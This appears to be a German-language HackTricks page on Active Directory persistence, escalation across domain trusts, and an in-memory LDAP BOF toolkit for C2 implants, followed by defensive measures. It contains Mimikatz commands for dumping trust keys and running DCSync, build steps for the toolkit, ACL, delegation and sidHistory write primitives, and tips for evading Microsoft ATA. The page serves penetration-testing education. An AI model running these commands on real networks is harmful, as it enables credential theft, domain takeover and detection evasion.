### AdminSDHolder Group

Das **AdminSDHolder**-Objekt in Active Directory sichert **privilegierte Gruppen** (wie Domain Admins und Enterprise Admins), indem es eine standardisierte **Access Control List (ACL)** auf diese Gruppen anwendet, um unbefugte Änderungen zu verhindern. Diese Funktion kann jedoch ausgenutzt werden; wenn ein Angreifer die ACL des AdminSDHolder so verändert, dass ein regulärer Benutzer vollständigen Zugriff erhält, gewinnt dieser Benutzer weitreichende Kontrolle über alle privilegierten Gruppen. Diese Sicherheitsmaßnahme kann sich somit ins Gegenteil verkehren und unbefugten Zugriff ermöglichen, wenn sie nicht genau überwacht wird.

[**Mehr Informationen zur AdminDSHolder Group hier.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Auf jedem **Domain Controller (DC)** existiert ein **lokales Administrator**-Konto. Durch das Erlangen von Admin-Rechten auf einer solchen Maschine kann der lokale Administrator-hash mit **mimikatz** extrahiert werden. Anschließend ist eine Registry-Änderung nötig, um die Nutzung dieses Passworts zu **aktivieren**, was den Remote-Zugriff auf das lokale Administrator-Konto ermöglicht.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Du könntest einem **Benutzer** gewisse **spezielle Berechtigungen** an bestimmten Domain-Objekten **geben**, die es dem Benutzer erlauben, in der Zukunft **Privilegien zu eskalieren**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Die **Security Descriptors** werden genutzt, um die **Berechtigungen** zu **speichern**, die ein **Objekt** auf einem **Objekt** hat. Wenn du nur eine **kleine Änderung** im **Security Descriptor** eines Objekts vornehmen kannst, kannst du sehr interessante Rechte über dieses Objekt erlangen, ohne Mitglied einer privilegierten Gruppe sein zu müssen.


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Verändere **LSASS** im Speicher, um ein **universelles Passwort** zu etablieren, das Zugriff auf alle Domain-Konten gewährt.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Du kannst dein **eigenes SSP** erstellen, um **Credentials im Klartext** zu **capturen**, die zum Zugriff auf die Maschine verwendet werden.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Es registriert einen **neuen Domain Controller** im AD und nutzt diesen, um **Attribute zu pushen** (SIDHistory, SPNs...) auf spezifizierte Objekte **ohne** Logs bezüglich der **Modifikationen** zu hinterlassen. Du **brauchst DA**-Rechte und musst im **root domain** sein.\
Beachte, dass bei Verwendung falscher Daten ziemlich hässliche Logs entstehen können.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Vorhin haben wir besprochen, wie man Privilegien eskalieren kann, wenn man **genügend Rechte hat, um LAPS-Passwörter zu lesen**. Diese Passwörter können jedoch auch genutzt werden, um **Persistence** aufrechtzuerhalten.\
Siehe:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft betrachtet das **Forest** als die Sicherheitsgrenze. Das impliziert, dass **die Kompromittierung einer einzelnen Domain potenziell zum Kompromiss des gesamten Forests führen kann**.

### Basic Information

Ein [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) ist ein Sicherheitsmechanismus, der einem Benutzer aus einer **Domain** ermöglicht, auf Ressourcen in einer anderen **Domain** zuzugreifen. Er stellt im Wesentlichen eine Verbindung zwischen den Authentifizierungssystemen der beiden Domains her, sodass Authentifizierungsprüfungen nahtlos fließen können. Wenn Domains eine Vertrauensstellung einrichten, tauschen sie bestimmte **keys** zwischen ihren **Domain Controllers (DCs)** aus und speichern diese, die für die Integrität der Vertrauensstellung entscheidend sind.

In einem typischen Szenario, wenn ein Benutzer auf einen Dienst in einer **trusted domain** zugreifen möchte, muss er zuerst ein spezielles Ticket, bekannt als **inter-realm TGT**, vom DC seiner eigenen Domain anfordern. Dieses TGT ist mit einem gemeinsamen **key** verschlüsselt, auf den sich beide Domains geeinigt haben. Der Benutzer präsentiert dann dieses TGT dem **DC der trusted domain**, um ein Service-Ticket (**TGS**) zu erhalten. Nach erfolgreicher Validierung des inter-realm TGT durch den DC der trusted domain stellt dieser ein TGS aus, das dem Benutzer den Zugriff auf den Dienst gewährt.

**Schritte**:

1. Ein **Client-Computer** in **Domain 1** beginnt den Prozess, indem er mit seinem **NTLM hash** ein **Ticket Granting Ticket (TGT)** von seinem **Domain Controller (DC1)** anfordert.
2. DC1 stellt ein neues TGT aus, wenn der Client erfolgreich authentifiziert wurde.
3. Der Client fordert dann ein **inter-realm TGT** von DC1 an, das benötigt wird, um auf Ressourcen in **Domain 2** zuzugreifen.
4. Das inter-realm TGT wird mit einem **trust key** verschlüsselt, der zwischen DC1 und DC2 als Teil der zweiseitigen Domain-Trusts geteilt wird.
5. Der Client bringt das inter-realm TGT zum **Domain Controller von Domain 2 (DC2)**.
6. DC2 verifiziert das inter-realm TGT mit seinem shared trust key und stellt, falls gültig, ein **Ticket Granting Service (TGS)** für den Server in Domain 2 aus, auf den der Client zugreifen möchte.
7. Schließlich präsentiert der Client dieses TGS dem Server, das mit dem Hash des Server-Accounts verschlüsselt ist, um Zugriff auf den Dienst in Domain 2 zu erhalten.

### Different trusts

Es ist wichtig zu beachten, dass **eine Vertrauensstellung einseitig oder zweiseitig** sein kann. Bei der zweiseitigen Option vertrauen sich beide Domains gegenseitig, aber bei einer **einseitigen** Vertrauensbeziehung ist eine Domain die **trusted** und die andere die **trusting** Domain. Im letzteren Fall **kannst du nur aus der trusted Domain auf Ressourcen innerhalb der trusting Domain zugreifen**.

Wenn Domain A Domain B vertraut, ist A die trusting Domain und B die trusted. Außerdem wäre dies in **Domain A** ein **Outbound trust**; und in **Domain B** ein **Inbound trust**.

**Verschiedene Vertrauensbeziehungen**

- **Parent-Child Trusts**: Dies ist eine häufige Konfiguration innerhalb desselben Forests, wobei eine Child-Domain automatisch eine zweiseitige transitive Vertrauensstellung mit ihrer Parent-Domain hat. Im Grunde bedeutet das, dass Authentifizierungsanfragen nahtlos zwischen Parent und Child fließen können.
- **Cross-link Trusts**: Auch als "shortcut trusts" bezeichnet, werden diese zwischen Child-Domains eingerichtet, um Referral-Prozesse zu beschleunigen. In komplexen Forests müssen Authentifizierungs-Referrals normalerweise bis zur Forest-Root und dann wieder zur Ziel-Domain reisen. Durch das Erstellen von Cross-Links wird die Strecke verkürzt, was besonders in geografisch verteilten Umgebungen vorteilhaft ist.
- **External Trusts**: Diese werden zwischen verschiedenen, nicht verbundenen Domains eingerichtet und sind per Natur nicht-transitiv. Laut [Microsoft-Dokumentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) sind External Trusts nützlich, um auf Ressourcen in einer Domain außerhalb des aktuellen Forests zuzugreifen, die nicht durch einen Forest Trust verbunden ist. Die Sicherheit wird durch SID-Filtering bei External Trusts erhöht.
- **Tree-root Trusts**: Diese Vertrauensstellungen werden automatisch zwischen der Forest-Root-Domain und einer neu hinzugefügten Tree-Root hergestellt. Obwohl sie nicht häufig vorkommen, sind Tree-root Trusts wichtig, um neue Domain-Trees zu einem Forest hinzuzufügen, sodass diese einen einzigartigen Domain-Namen beibehalten und zweiseitige Transitivität gewährleistet ist. Mehr Informationen findest du im [Microsoft-Guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Dieser Trust-Typ ist eine zweiseitige transitive Vertrauensstellung zwischen zwei Forest-Root-Domains und erzwingt ebenfalls SID-Filtering, um die Sicherheitsmaßnahmen zu verstärken.
- **MIT Trusts**: Diese Vertrauensstellungen werden mit nicht-Windows, [RFC4120-kompatiblen](https://tools.ietf.org/html/rfc4120) Kerberos-Domains eingerichtet. MIT Trusts sind etwas spezialisierter und dienen Umgebungen, die Integration mit Kerberos-basierten Systemen außerhalb des Windows-Ökosystems erfordern.

#### Other differences in **trusting relationships**

- Eine Vertrauensbeziehung kann auch **transitiv** sein (A vertraut B, B vertraut C, dann vertraut A C) oder **nicht-transitiv**.
- Eine Vertrauensbeziehung kann als **bidirektional trust** (beide vertrauen einander) oder als **one-way trust** (nur eine vertraut der anderen) eingerichtet werden.

### Attack Path

1. **Enumeriere** die Vertrauensbeziehungen
2. Prüfe, ob irgendein **security principal** (user/group/computer) **Zugriff** auf Ressourcen der **anderen Domain** hat, vielleicht durch ACE-Einträge oder durch Mitgliedschaft in Gruppen der anderen Domain. Suche nach **Beziehungen über Domains hinweg** (die Vertrauensstellung wurde vermutlich dafür erstellt).
1. kerberoast könnte in diesem Fall eine weitere Option sein.
3. **Kompromittiere** die **Accounts**, die zwischen Domains **pivoten** können.

Angreifer können über drei Hauptmechanismen auf Ressourcen in einer anderen Domain zugreifen:

- **Lokale Gruppenmitgliedschaft**: Principals könnten zu lokalen Gruppen auf Maschinen hinzugefügt werden, wie der “Administrators”-Gruppe auf einem Server, was ihnen bedeutende Kontrolle über diese Maschine gibt.
- **Membership in einer fremden Domain-Gruppe**: Principals können auch Mitglieder von Gruppen innerhalb der fremden Domain sein. Die Effektivität dieser Methode hängt jedoch von der Art des Trusts und dem Umfang der Gruppe ab.
- **Access Control Lists (ACLs)**: Principals könnten in einer **ACL** angegeben sein, insbesondere als Entitäten in **ACEs** innerhalb einer **DACL**, wodurch sie Zugriff auf spezifische Ressourcen erhalten. Wer tiefer in die Mechanik von ACLs, DACLs und ACEs eintauchen möchte, sollte das Whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” lesen.

### Find external users/groups with permissions

Du kannst **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** prüfen, um fremde Security Principals in der Domain zu finden. Diese sind Benutzer/Gruppen aus **einer externen Domain/Forest**.

Du kannst das in **Bloodhound** oder mit powerview prüfen:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Andere Möglichkeiten, Domänen-Trusts zu enumerieren:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Es gibt **2 trusted keys**, eine für _Child --> Parent_ und eine andere für _Parent_ --> _Child_.\
> Sie können den von der aktuellen Domain verwendeten Schlüssel damit ermitteln:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Als Enterprise admin in die Child-/Parent-Domain eskalieren, indem die Trust-Beziehung mit SID-History injection ausgenutzt wird:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Es ist entscheidend zu verstehen, wie der Configuration Naming Context (NC) ausgenutzt werden kann. Der Configuration NC dient als zentrales Repository für Konfigurationsdaten innerhalb eines Forests in Active Directory (AD)-Umgebungen. Diese Daten werden an jeden Domain Controller (DC) im Forest repliziert; schreibbare DCs führen eine schreibbare Kopie des Configuration NC. Um dies auszunutzen, benötigt man **SYSTEM-Rechte auf einem DC**, idealerweise auf einem Child-DC.

**GPO mit root-DC-Site verknüpfen**

Der Sites-Container des Configuration NC enthält Informationen über die Sites aller an die Domain angebundenen Computer innerhalb des AD-Forests. Mit SYSTEM-Rechten auf einem beliebigen DC können Angreifer GPOs mit den root-DC-Sites verknüpfen. Diese Aktion kann die Root-Domain kompromittieren, indem Richtlinien, die auf diese Sites angewendet werden, manipuliert werden.

Für detaillierte Informationen kann man die Forschung zu [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research) heranziehen.

**Jede gMSA im Forest kompromittieren**

Ein Angriffsvektor besteht darin, privilegierte gMSAs innerhalb der Domain anzugreifen. Der KDS Root key, der für die Berechnung der Passwörter von gMSAs erforderlich ist, wird im Configuration NC gespeichert. Mit SYSTEM-Rechten auf einem beliebigen DC ist es möglich, auf den KDS Root key zuzugreifen und die Passwörter beliebiger gMSAs im gesamten Forest zu berechnen.

Detaillierte Analyse und Schritt-für-Schritt-Anleitungen finden Sie in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Komplementäre delegated MSA-Attacke (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Weitere externe Forschung: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Diese Methode erfordert Geduld, da man auf die Erstellung neuer privilegierter AD-Objekte warten muss. Mit SYSTEM-Rechten kann ein Angreifer das AD Schema ändern, um jedem Benutzer vollständige Kontrolle über alle Klassen zu gewähren. Dies könnte zu unautorisiertem Zugriff und Kontrolle über neu erstellte AD-Objekte führen.

Weiterführende Lektüre ist verfügbar unter [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Die ADCS ESC5-Schwachstelle zielt darauf ab, Kontrolle über Public Key Infrastructure (PKI)-Objekte zu erlangen, um eine Zertifikatvorlage zu erstellen, die die Authentifizierung als beliebiger Benutzer innerhalb des Forests ermöglicht. Da PKI-Objekte im Configuration NC liegen, ermöglicht die Kompromittierung eines schreibbaren Child-DC die Durchführung von ESC5-Angriffen.

Mehr Details dazu finden sich in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In Szenarien ohne ADCS kann der Angreifer die erforderlichen Komponenten selbst einrichten, wie in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) beschrieben.

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
In diesem Szenario **deine Domäne vertraut wird** von einer externen Domäne, wodurch du **unbestimmte Berechtigungen** darauf erhältst. Du musst herausfinden, **welche principals deiner Domäne welchen Zugriff auf die externe Domäne haben**, und dann versuchen, diese auszunutzen:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Externe Forest-Domäne - Einseitig (Ausgehend)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In diesem Szenario vertraut **deine Domain** einigen **Rechten** einem Principal aus **anderen Domains**.

Wenn jedoch eine **Domain von der vertrauenden Domain vertraut wird**, erstellt die vertrauende Domain einen **Benutzer** mit einem **vorhersehbaren Namen**, der als **Passwort das Trusted Password** verwendet. Das bedeutet, dass es möglich ist, **einen Benutzer aus der vertrauenden Domain zu nutzen, um in die vertrauende Domain zu gelangen**, sie zu enumerieren und zu versuchen, weitere Rechte zu eskalieren:

{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Eine weitere Möglichkeit, die vertrauende Domain zu kompromittieren, besteht darin, einen [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) zu finden, der in die **entgegengesetzte Richtung** der Domain-Trusts erstellt wurde (was nicht sehr häufig vorkommt).

Eine andere Methode, die vertrauende Domain zu kompromittieren, ist es, auf einem Rechner zu warten, auf den sich ein **Benutzer aus der trusted domain per RDP anmelden kann**. Dann könnte der Angreifer Code in den RDP-Session-Prozess injizieren und **von dort aus auf die Origin-Domain des Opfers** zugreifen.\
Wenn das **Opfer sein Laufwerk eingebunden** hat, könnte der Angreifer aus dem **RDP-Session**-Prozess **backdoors** im **Autostart-Ordner des Laufwerks** ablegen. Diese Technik wird **RDPInception** genannt.

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Maßnahmen gegen Missbrauch von Domain-Trusts

### **SID Filtering:**

- Das Risiko von Angriffen, die das SID history attribute über Forest-Trusts ausnutzen, wird durch SID Filtering gemindert, das standardmäßig für alle inter-forest trusts aktiviert ist. Dies basiert auf der Annahme, dass intra-forest trusts sicher sind und der Forest statt der Domain als Sicherheitsgrenze betrachtet wird, wie von Microsoft vertreten.
- Es gibt jedoch einen Haken: SID Filtering kann Anwendungen und Benutzerzugriffe stören, was gelegentlich zu seiner Deaktivierung führt.

### **Selective Authentication:**

- Bei inter-forest trusts sorgt Selective Authentication dafür, dass Benutzer aus den beiden Forests nicht automatisch authentifiziert werden. Stattdessen sind explizite Berechtigungen erforderlich, damit sich Benutzer gegenüber Domains und Servern in der vertrauenden Domain oder dem Forest authentifizieren können.
- Es ist wichtig zu beachten, dass diese Maßnahmen nicht vor der Ausnutzung des beschreibbaren Configuration Naming Context (NC) oder vor Angriffen auf das Trust-Konto schützen.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-basierter AD-Missbrauch durch On-Host Implants

Die [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) implementiert bloodyAD-style LDAP-Primitiven neu als x64 Beacon Object Files, die vollständig innerhalb eines On-Host-Implants (z. B. Adaptix C2) laufen. Operatoren kompilieren das Paket mit `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, laden `ldap.axs` und rufen dann `ldap <subcommand>` vom Beacon auf. Der gesamte Verkehr nutzt den aktuellen Logon-Sicherheitskontext über LDAP (389) mit Signing/Sealing oder LDAPS (636) mit automatischem Certificate Trust, sodass keine Socks-Proxies oder Disk-Artefakte erforderlich sind.

### Implant-seitige LDAP-Enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` lösen Kurz-Namen/OU-Pfade in vollständige DNs auf und dumpen die entsprechenden Objekte.
- `get-object`, `get-attribute`, and `get-domaininfo` ziehen beliebige Attribute (einschließlich security descriptors) sowie die Forest-/Domain-Metadaten aus `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` offenbaren roasting candidates, Delegationseinstellungen und bestehende [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) Deskriptoren direkt aus LDAP.
- `get-acl` und `get-writable --detailed` parsen die DACL, um Trustees, Rechte (GenericAll/WriteDACL/WriteOwner/attribute writes) und Vererbung aufzulisten und liefern unmittelbare Ziele für ACL-Privilegieneskalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write-Primitiven für Eskalation & Persistenz

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) erlauben dem Operator, neue principals oder Machine-Accounts überall dort zu platzieren, wo OU-Rechte bestehen. `add-groupmember`, `set-password`, `add-attribute` und `set-attribute` kapern Ziele direkt, sobald write-property-Rechte vorhanden sind.
- ACL-fokussierte Befehle wie `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` und `add-dcsync` übersetzen WriteDACL/WriteOwner auf beliebigen AD-Objekten in Passwort-Resets, Gruppenmitgliedschafts-Kontrolle oder DCSync-Replikationsprivilegien, ohne PowerShell/ADSI-Artefakte zu hinterlassen. `remove-*` Gegenstücke bereinigen injizierte ACEs.

### Delegation, roasting, und Kerberos-Missbrauch

- `add-spn`/`set-spn` machen einen kompromittierten Benutzer sofort Kerberoastable; `add-asreproastable` (UAC-Umschalter) markiert ihn für AS-REP roasting, ohne das Passwort zu berühren.
- Delegation-Makros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) schreiben `msDS-AllowedToDelegateTo`, UAC-Flags oder `msDS-AllowedToActOnBehalfOfOtherIdentity` vom Beacon aus neu, ermöglichen constrained/unconstrained/RBCD-Angriffswege und beseitigen die Notwendigkeit für remote PowerShell oder RSAT.

### sidHistory-Injection, OU-Relokation und Formung der Angriffsfläche

- `add-sidhistory` injiziert privilegierte SIDs in die SID-History eines kontrollierten principals (siehe [SID-History Injection](sid-history-injection.md)) und ermöglicht so eine unauffällige Zugriffsvererbung vollständig über LDAP/LDAPS.
- `move-object` ändert den DN/OU von Computern oder Benutzern, sodass ein Angreifer Assets in OUs verschieben kann, in denen bereits delegierte Rechte existieren, bevor er `set-password`, `add-groupmember` oder `add-spn` missbraucht.
- Eng gefasste Entfernungskommandos (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) erlauben ein schnelles Zurücksetzen, nachdem der Operator Anmeldeinformationen oder Persistenz extrahiert hat, und minimieren Telemetrie.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Einige allgemeine Abwehrmaßnahmen

[**Erfahren Sie hier mehr darüber, wie Sie Anmeldeinformationen schützen können.**](../stealing-credentials/credentials-protections.md)

### **Verteidigungsmaßnahmen zum Schutz von Anmeldeinformationen**

- **Einschränkungen für Domain Admins**: Es wird empfohlen, dass Domain Admins sich nur an Domain Controllern anmelden dürfen und ihre Nutzung auf anderen Hosts vermieden wird.
- **Berechtigungen für Service Accounts**: Dienste sollten nicht mit Domain Admin (DA)-Privilegien ausgeführt werden, um die Sicherheit zu gewährleisten.
- **Zeitliche Begrenzung von Privilegien**: Für Aufgaben, die DA-Privilegien erfordern, sollte deren Dauer begrenzt werden. Dies kann z. B. erreicht werden durch: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP-Relay-Minderung**: Audit Event IDs 2889/3074/3075 überwachen und anschließend LDAP signing sowie LDAPS channel binding auf DCs/Clients durchsetzen, um LDAP MITM/relay-Versuche zu blockieren.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementierung von Täuschungstechniken**

- Die Implementierung von Täuschungen umfasst das Aufstellen von Fallen, wie Köder-Benutzer oder -Computer, mit Merkmalen wie nie ablaufenden Passwörtern oder dem Status Trusted for Delegation. Ein detaillierter Ansatz beinhaltet das Erstellen von Benutzern mit spezifischen Rechten oder deren Hinzufügung zu hoch privilegierten Gruppen.
- Ein praktisches Beispiel nutzt Tools wie: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Mehr zum Einsatz von Täuschungstechniken findet sich unter [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Erkennung von Täuschungen**

- **Bei Benutzerobjekten**: Auffällige Indikatoren sind untypische ObjectSID, seltene Logons, Erstellungsdaten und niedrige Counts fehlerhafter Passwortversuche.
- **Allgemeine Indikatoren**: Der Vergleich von Attributen potenzieller Köderobjekte mit echten Objekten kann Inkonsistenzen aufdecken. Tools wie [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) können bei der Identifikation solcher Täuschungen helfen.

### **Umgehung von Erkennungssystemen**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Vermeiden von Session-Enumeration auf Domain Controllern, um ATA-Detektion zu verhindern.
- **Ticket Impersonation**: Die Nutzung von **aes**-Keys zur Erstellung von Tickets hilft, Erkennung zu umgehen, da kein Downgrade auf NTLM erfolgt.
- **DCSync Attacks**: Es wird empfohlen, DCSync von einem Nicht-Domain-Controller auszuführen, um ATA-Detektion zu vermeiden, da direkte Ausführung auf einem Domain Controller Alarme auslöst.

## Referenzen

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
